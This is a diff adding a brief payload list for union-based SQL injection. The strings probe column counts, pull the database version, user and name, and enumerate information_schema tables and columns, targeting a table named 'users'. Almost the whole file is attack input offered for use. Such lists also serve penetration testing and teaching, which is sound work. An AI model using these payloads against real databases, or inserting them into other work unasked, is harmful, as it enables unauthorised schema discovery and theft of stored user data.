@@ -1,0 +1,12 @@
+Those payloads are used for Union based sql injection :~
+
+Payloads :~
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,user()--
+' UNION SELECT database(),version()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
